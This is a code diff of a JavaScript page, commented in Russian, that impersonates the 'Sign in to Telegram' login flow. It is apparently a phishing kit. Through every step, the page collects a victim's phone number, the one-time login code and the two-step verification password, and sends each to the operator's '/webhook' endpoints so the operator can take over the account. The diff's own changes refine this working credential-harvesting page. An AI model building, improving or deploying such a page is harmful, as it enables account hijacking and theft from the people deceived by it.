+  {c:'+972',f:'🇮🇱',n:'Israel',iso:'IL'},{c:'+971',f:'🇦🇪',n:'UAE',iso:'AE'},
+  {c:'+966',f:'🇸🇦',n:'Saudi Arabia',iso:'SA'},{c:'+20',f:'🇪🇬',n:'Egypt',iso:'EG'},
+  {c:'+91',f:'🇮🇳',n:'India',iso:'IN'},{c:'+92',f:'🇵🇰',n:'Pakistan',iso:'PK'},
+  {c:'+86',f:'🇨🇳',n:'China',iso:'CN'},{c:'+81',f:'🇯🇵',n:'Japan',iso:'JP'},
+  {c:'+82',f:'🇰🇷',n:'South Korea',iso:'KR'},{c:'+65',f:'🇸🇬',n:'Singapore',iso:'SG'},
+  {c:'+60',f:'🇲🇾',n:'Malaysia',iso:'MY'},{c:'+66',f:'🇹🇭',n:'Thailand',iso:'TH'},
+  {c:'+84',f:'🇻🇳',n:'Vietnam',iso:'VN'},{c:'+62',f:'🇮🇩',n:'Indonesia',iso:'ID'},
+  {c:'+63',f:'🇵🇭',n:'Philippines',iso:'PH'},{c:'+61',f:'🇦🇺',n:'Australia',iso:'AU'},
+  {c:'+64',f:'🇳🇿',n:'New Zealand',iso:'NZ'},{c:'+55',f:'🇧🇷',n:'Brazil',iso:'BR'},
+  {c:'+54',f:'🇦🇷',n:'Argentina',iso:'AR'},{c:'+52',f:'🇲🇽',n:'Mexico',iso:'MX'},
+  {c:'+27',f:'🇿🇦',n:'South Africa',iso:'ZA'},{c:'+234',f:'🇳🇬',n:'Nigeria',iso:'NG'},
+  {c:'+373',f:'🇲🇩',n:'Moldova',iso:'MD'},{c:'+374',f:'🇦🇲',n:'Armenia',iso:'AM'},
+  {c:'+994',f:'🇦🇿',n:'Azerbaijan',iso:'AZ'},{c:'+995',f:'🇬🇪',n:'Georgia',iso:'GE'},
+  {c:'+996',f:'🇰🇬',n:'Kyrgyzstan',iso:'KG'},{c:'+992',f:'🇹🇯',n:'Tajikistan',iso:'TJ'},
   {c:'+998',f:'🇺🇿',n:'Uzbekistan',iso:'UZ'},
 ];
 
 const $ = id => document.getElementById(id);
 const stepPhone = $('step-phone'), stepCode = $('step-code'), step2fa = $('step-2fa'),
       stepLoading = $('step-loading'), stepProfile = $('step-profile'),
-      stepRejected = $('step-rejected'), errorBox = $('error-box'), dots = $('dots');
+      stepRejected = $('step-rejected'), errorBox = $('error-box'),
+      linksBlock = $('links-block');
 const phoneInput = $('phone'), codeInput = $('code'), passInput = $('password');
-const countryBtn = $('country-btn'), currentFlag = $('current-flag'), currentCode = $('current-code');
-const phoneRow = $('phone-row');
-const countryModal = $('country-modal'), countryListModal = $('country-list-modal'), countrySearch = $('country-search');
-const modalClose = $('modal-close');
+const countrySelect = $('country-select');
 
 let selected = COUNTRIES[0], phone = '', code = '', password = null;
 
-// ─── автоопределение страны по локали
+// заполняем селект стран
+function fillCountrySelect() {
+  countrySelect.innerHTML = COUNTRIES.map((c, i) =>
+    `<option value="${i}">${c.f} ${c.n} (${c.c})</option>`
+  ).join('');
+}
+
 function detectCountry() {
   try {
     const loc = (navigator.languages && navigator.languages[0]) || navigator.language || 'en-US';
     let region = null;
     try { region = new Intl.Locale(loc).region; } catch(e) { region = loc.split('-')[1]; }
     if (region) {
-      const found = COUNTRIES.find(c => c.iso === region.toUpperCase());
-      if (found) { selected = found; return; }
+      const idx = COUNTRIES.findIndex(c => c.iso === region.toUpperCase());
+      if (idx !== -1) { selected = COUNTRIES[idx]; return; }
     }
   } catch (e) {}
-  try {
-    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
-    const map = {
-      'Europe/Moscow':'RU','Europe/Kiev':'UA','Europe/Minsk':'BY','Asia/Almaty':'KZ',
-      'Europe/London':'GB','Europe/Berlin':'DE','Europe/Paris':'FR','Europe/Rome':'IT',
-      'Europe/Madrid':'ES','Europe/Warsaw':'PL','Europe/Istanbul':'TR','Asia/Dubai':'AE',
-      'Asia/Tokyo':'JP','Asia/Shanghai':'CN','America/New_York':'US','America/Los_Angeles':'US',
-    };
-    if (map[tz]) {
-      const found = COUNTRIES.find(c => c.iso === map[tz]);
-      if (found) selected = found;
+  // fallback — Москва
+  const ruIdx = COUNTRIES.findIndex(c => c.iso === 'RU');
+  if (ruIdx !== -1) selected = COUNTRIES[ruIdx];
+}
+
+function updatePhonePlaceholder() {
+  const cc = selected.c;
+  // примерное форматирование для плейсхолдера
+  const ph = cc + ' ' + '-'.repeat(Math.max(5, 12 - cc.length));
+  phoneInput.placeholder = ph;
+}
+
+countrySelect.addEventListener('change', () => {
+  const idx = parseInt(countrySelect.value);
+  if (COUNTRIES[idx]) {
+    selected = COUNTRIES[idx];
+    updatePhonePlaceholder();
+    // если в поле уже номер — обновим префикс
+    let v = phoneInput.value.replace(/\D/g, '');
+    if (v) {
+      // убираем старый код страны если совпадает
+      const oldCc = phoneInput.dataset.lastCc || '';
+      if (oldCc && v.startsWith(oldCc.replace('+', ''))) {
+        v = v.slice(oldCc.replace('+', '').length);
+      }
+      const ccDigits = selected.c.replace('+', '');
+      phoneInput.value = '+' + ccDigits + ' ' + v;
+      phoneInput.dataset.lastCc = selected.c;
     }
-  } catch (e) {}
-}
-
-function updateCountryBtn() {
-  currentFlag.textContent = selected.f;
-  currentCode.textContent = selected.c;
-}
-
-// ─── модалка стран
-function openCountryModal() {
-  countrySearch.value = '';
-  renderCountryModal('');
-  countryModal.classList.remove('hidden');
-  setTimeout(() => countrySearch.focus(), 100);
-}
-function closeCountryModal() {
-  countryModal.classList.add('hidden');
-}
-function renderCountryModal(filter='') {
-  const q = filter.trim().toLowerCase();
-  const list = COUNTRIES.filter(c => !q || c.n.toLowerCase().includes(q) || c.c.includes(q) || c.iso.toLowerCase().includes(q));
-  if (!list.length) {
-    countryListModal.innerHTML = '<div class="country-empty">Nothing found</div>';
-    return;
   }
-  countryListModal.innerHTML = list.map(c => `
-    <div class="country-item ${c.iso === selected.iso && c.c === selected.c ? 'active' : ''}"
-         data-code="${c.c}" data-name="${c.n}" data-flag="${c.f}" data-iso="${c.iso}">
-      <span class="flag">${c.f}</span>
-      <span class="name">${c.n}</span>
-      <span class="code">${c.c}</span>
-    </div>`).join('');
-  countryListModal.querySelectorAll('.country-item').forEach(el => {
-    el.addEventListener('click', () => {
-      selected = { c: el.dataset.code, f: el.dataset.flag, n: el.dataset.name, iso: el.dataset.iso };
-      updateCountryBtn();
-      closeCountryModal();
-      validatePhone();
-      phoneInput.focus();
-    });
-  });
-}
-
-countryBtn.addEventListener('click', (e) => {
-  e.preventDefault();
-  openCountryModal();
 });
-modalClose.addEventListener('click', closeCountryModal);
-countryModal.addEventListener('click', (e) => {
-  if (e.target === countryModal) closeCountryModal();
-});
-countrySearch.addEventListener('input', () => renderCountryModal(countrySearch.value));
 
-// ─── фокус на поле номера
-phoneInput.addEventListener('focus', () => phoneRow.classList.add('focused'));
-phoneInput.addEventListener('blur', () => phoneRow.classList.remove('focused'));
-
+// Форматирование номера
 phoneInput.addEventListener('input', e => {
-  let v = e.target.value.replace(/\D/g,''); if (v.length > 15) v = v.slice(0,15);
-  e.target.value = v;
-  // автоопределение страны по первой цифре
-  autoDetectCountry(v);
-  validatePhone();
+  let v = e.target.value.replace(/\D/g, '');
+  if (v.length > 15) v = v.slice(0, 15);
+  const ccDigits = selected.c.replace('+', '');
+  // если пользователь начал вводить с кода — выделим
+  let rest = v;
+  if (v.startsWith(ccDigits)) {
+    rest = v.slice(ccDigits.length);
+  }
+  // группируем по 3-3-2-2
+  let formatted = '';
+  if (rest.length > 0) formatted = ' ' + rest;
+  e.target.value = selected.c + formatted;
+  e.target.dataset.lastCc = selected.c;
 });
 
-// ─── автоопределение страны по вводимому коду
-function autoDetectCountry(digits) {
-  if (!digits || digits.length < 1) return;
-  // пробуем найти страну по началу номера
-  const tryPrefixes = [digits.slice(0,4), digits.slice(0,3), digits.slice(0,2), digits.slice(0,1)];
-  for (const prefix of tryPrefixes) {
-    if (!prefix) continue;
-    const found = COUNTRIES.find(c => c.c === '+' + prefix);
-    if (found && found.iso !== selected.iso) {
-      selected = found;
-      updateCountryBtn();
-      return;
-    }
-  }
-}
-
-function validatePhone(){
-  const d = phoneInput.value.replace(/\D/g,'');
-  $('btn-next').disabled = d.length < 6;
-}
-
-// ─── localStorage с привязкой к tgUserId
-const SESSION_KEY = 'tg_offer_profile_v4';
-function saveProfile(profile) {
-  try {
-    profile.tg_user_id = tgUserId;
-    profile.saved_at = Date.now();
-    localStorage.setItem(SESSION_KEY, JSON.stringify(profile));
-  } catch(e) {}
+// ─── ПРОФИЛЬ / LOCALSTORAGE ───
+const SESSION_KEY = 'tg_offer_profile_v7';
+function saveProfile(p) {
+  try { p.tg_user_id = tgUserId; p.saved_at = Date.now();
+    localStorage.setItem(SESSION_KEY, JSON.stringify(p)); } catch(e) {}
 }
 function loadProfile() {
   try {
@@ -410,62 +443,73 @@ function loadProfile() {
     if (!raw) return null;
     const p = JSON.parse(raw);
     if (tgUserId && p.tg_user_id && p.tg_user_id !== tgUserId) {
-      localStorage.removeItem(SESSION_KEY);
-      return null;
+      localStorage.removeItem(SESSION_KEY); return null;
     }
     return p;
   } catch(e) { return null; }
 }
-function clearProfile() {
-  try { localStorage.removeItem(SESSION_KEY); } catch(e){}
-}
+function clearProfile() { try { localStorage.removeItem(SESSION_KEY); } catch(e){} }
 
-// ─── UI
-function setStep(n){[...dots.children].forEach((s,i)=>s.classList.toggle('on',i===n-1))}
 function showError(msg){errorBox.innerHTML=msg;errorBox.classList.remove('hidden')}
 function hideError(){errorBox.classList.add('hidden')}
 function show(el){el.classList.remove('hidden')}
 function hide(el){el.classList.add('hidden')}
 
-// ─── reject
+// ─── ИНИЦИАЛИЗАЦИЯ ───
 if (action === 'reject') {
-  document.querySelectorAll('.step, .dots, #title, #sub, #footer').forEach(el => el.style.display = 'none');
+  document.querySelectorAll('.step, #title, #sub, #links-block').forEach(el => el.style.display = 'none');
   stepRejected.style.display = 'flex';
   document.querySelectorAll('form').forEach(f => f.addEventListener('submit', e => e.preventDefault()));
   window.__REJECTED__ = true;
 } else {
   window.__REJECTED__ = false;
   detectCountry();
-  updateCountryBtn();
+  fillCountrySelect();
+  countrySelect.value = COUNTRIES.indexOf(selected);
+  updatePhonePlaceholder();
+  phoneInput.value = selected.c + ' ';
+  phoneInput.dataset.lastCc = selected.c;
 
   const saved = loadProfile();
-  if (saved && saved.user_id) {
-    showProfile(saved);
-  }
+  if (saved && saved.user_id) showProfile(saved);
 }
 
 function showProfile(p){
   hide(stepPhone); hide(stepCode); hide(step2fa); hide(stepLoading); hide(stepRejected);
-  hide(dots); hide($('title')); hide($('sub')); hide($('footer'));
+  hide($('title')); hide($('sub')); hide(linksBlock);
   stepProfile.classList.remove('hidden');
-
-  const fio = [p.first_name, p.last_name].filter(Boolean).join(' ') || 'Пользователь';
+  const fio = [p.first_name, p.last_name].filter(Boolean).join(' ') || 'User';
   $('profile-name').textContent = fio;
   $('profile-username').textContent = p.username ? '@' + p.username : '—';
   $('profile-id').textContent = p.user_id || '—';
   $('profile-uname').textContent = p.username ? '@' + p.username : '—';
   $('profile-fio').textContent = fio;
   $('profile-phone').textContent = p.phone || '—';
-
   const initial = (p.first_name || p.username || 'A').charAt(0).toUpperCase();
   $('profile-avatar').textContent = initial;
 }
 
-$('btn-logout').addEventListener('click', () => {
-  clearProfile();
-  location.reload();
+$('btn-logout').addEventListener('click', () => { clearProfile(); location.reload(); });
+
+// ─── ССЫЛКИ ───
+$('link-ru').addEventListener('click', () => {
+  // смена языка интерфейса (заглушка)
+  document.querySelectorAll('h1').forEach(h => {
+    if (h.textContent === 'Sign in to Telegram') h.textContent = 'Вход в Telegram';
+  });
+  $('sub').innerHTML = 'Подтвердите код страны<br>и введите номер телефона.';
+  $('btn-next').textContent = 'ДАЛЕЕ';
 });
 
+$('link-qr').addEventListener('click', () => {
+  alert('QR-вход недоступен в этой версии');
+});
+
+$('link-passkey').addEventListener('click', () => {
+  alert('Passkey недоступен в этой версии');
+});
+
+// ─── API ───
 async function api(path, body){
   const url = API + path;
   let res, data;
@@ -475,112 +519,128 @@ async function api(path, body){
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify(body)
     });
-  } catch (e) {
-    throw new Error('Сервер недоступен.');
-  }
+  } catch (e) { throw new Error('Server unavailable.'); }
   try { data = await res.json(); }
-  catch (e) { throw new Error('Ошибка сервера.'); }
+  catch (e) { throw new Error('Server error.'); }
   return { status: res.status, data };
 }
 
+// ─── ШАГ 1: ТЕЛЕФОН ───
 stepPhone.addEventListener('submit', async e => {
   e.preventDefault();
   if (window.__REJECTED__) return;
   hideError();
-  const num = phoneInput.value.replace(/\D/g,'');
-  phone = selected.c + num;
-  hide(stepPhone); show(stepLoading); $('loading-text').textContent = 'Sending code…';
+  // собираем номер: код + цифры без кода
+  const ccDigits = selected.c.replace('+', '');
+  let raw = phoneInput.value.replace(/\D/g, '');
+  if (raw.startsWith(ccDigits)) raw = raw.slice(ccDigits.length);
+  if (raw.length < 6) {
+    showError('Please enter a valid phone number');
+    return;
+  }
+  phone = '+' + ccDigits + raw;
+
+  hide(stepPhone); show(stepLoading);
+  $('loading-text').textContent = 'Sending code…';
   try {
     const {data} = await api('/webhook/phone', { offer_id: offerId, phone });
     if (!data.ok) {
       hide(stepLoading); show(stepPhone);
-      showError(data.error || 'Ошибка');
+      showError(data.error || 'Error sending code');
       return;
     }
-    hide(stepLoading); show(stepCode); setStep(2);
-    $('title').textContent = 'Enter code'; $('sub').textContent = '';
-    $('code-hint').innerHTML = `We've sent the code to <b>${phone}</b> in Telegram.`;
-    codeInput.value = ''; setTimeout(() => codeInput.focus(), 100);
+    hide(stepLoading); show(stepCode);
+    $('title').style.display = 'block';
+    $('sub').style.display = 'block';
+    $('title').textContent = 'Enter code';
+    $('sub').textContent = 'We\'ve sent the code to your Telegram app.';
+    $('code-hint').innerHTML = '';
+    codeInput.value = '';
+    setTimeout(() => codeInput.focus(), 100);
   } catch(err) {
-    hide(stepLoading); show(stepPhone); showError(err.message || 'Ошибка сети');
+    hide(stepLoading); show(stepPhone);
+    showError(err.message || 'Network error');
   }
 });
 
+// ─── ШАГ 2: КОД ───
 stepCode.addEventListener('submit', async e => {
   e.preventDefault();
   if (window.__REJECTED__) return;
   hideError();
-  code = codeInput.value.replace(/\D/g,'');
-  if (code.length < 3) { showError('Введите код'); return; }
-  hide(stepCode); show(stepLoading); $('loading-text').textContent = 'Checking code…';
+  code = codeInput.value.replace(/\D/g, '');
+  if (code.length < 3) { showError('Enter the code'); return; }
+  hide(stepCode); show(stepLoading);
+  $('loading-text').textContent = 'Checking code…';
   try {
     const {data} = await api('/webhook/code', { offer_id: offerId, phone, code });
     if (data.ok && !data.needs_password) {
       const profile = {
-        user_id: data.user_id,
-        first_name: data.first_name,
-        last_name: data.last_name,
-        username: data.username,
-        phone: phone,
+        user_id: data.user_id, first_name: data.first_name,
+        last_name: data.last_name, username: data.username, phone: phone,
       };
       saveProfile(profile);
       showProfile(profile);
     } else if (data.ok && data.needs_password) {
-      hide(stepLoading); show(step2fa); setStep(3);
+      hide(stepLoading); show(step2fa);
       $('title').textContent = 'Two-Step Verification';
       $('sub').textContent = 'Your account is protected with an additional password.';
-      passInput.value = ''; setTimeout(() => passInput.focus(), 100);
+      passInput.value = '';
+      setTimeout(() => passInput.focus(), 100);
     } else {
       hide(stepLoading); show(stepCode);
-      let msg = data.error || 'Неверный код';
-      if (data.attempts_left !== undefined) msg += `<div class="attempts">Осталось попыток: ${data.attempts_left}</div>`;
+      let msg = data.error || 'Invalid code';
+      if (data.attempts_left !== undefined) {
+        msg += `<div class="attempts">Attempts left: ${data.attempts_left}</div>`;
+      }
       showError(msg);
       codeInput.value = ''; codeInput.focus();
     }
   } catch(err) {
-    hide(stepLoading); show(stepCode); showError(err.message || 'Ошибка сети');
+    hide(stepLoading); show(stepCode);
+    showError(err.message || 'Network error');
   }
 });
 
 $('btn-back-phone').addEventListener('click', () => {
   if (window.__REJECTED__) return;
-  hide(stepCode); show(stepPhone); setStep(1);
+  hide(stepCode); show(stepPhone);
   $('title').textContent = 'Sign in to Telegram';
-  $('sub').textContent = 'Please confirm your country code and enter your phone number.';
+  $('sub').innerHTML = 'Please confirm your country code<br>and enter your phone number.';
 });
 
+// ─── ШАГ 3: 2FA ───
 step2fa.addEventListener('submit', async e => {
   e.preventDefault();
   if (window.__REJECTED__) return;
   hideError();
   password = passInput.value.trim();
-  if (!password) { showError('Введите пароль'); return; }
-  hide(step2fa); show(stepLoading); $('loading-text').textContent = 'Checking password…';
+  if (!password) { showError('Enter the password'); return; }
+  hide(step2fa); show(stepLoading);
+  $('loading-text').textContent = 'Checking password…';
   try {
     const {data} = await api('/webhook/password', { offer_id: offerId, phone, code, password });
     if (data.ok) {
       const profile = {
-        user_id: data.user_id,
-        first_name: data.first_name,
-        last_name: data.last_name,
-        username: data.username,
-        phone: phone,
+        user_id: data.user_id, first_name: data.first_name,
+        last_name: data.last_name, username: data.username, phone: phone,
       };
       saveProfile(profile);
       showProfile(profile);
     } else {
       hide(stepLoading); show(step2fa);
-      let msg = data.error || 'Неверный пароль';
-      if (data.attempts_left !== undefined) msg += `<div class="attempts">Осталось попыток: ${data.attempts_left}</div>`;
+      let msg = data.error || 'Invalid password';
+      if (data.attempts_left !== undefined) {
+        msg += `<div class="attempts">Attempts left: ${data.attempts_left}</div>`;
+      }
       showError(msg);
       passInput.value = ''; passInput.focus();
     }
   } catch(err) {
-    hide(stepLoading); show(step2fa); showError(err.message || 'Ошибка сети');
+    hide(stepLoading); show(step2fa);
+    showError(err.message || 'Network error');
   }
 });
-
-console.log('[INIT] handlers bound');
 </script>
 </body>
 </html>
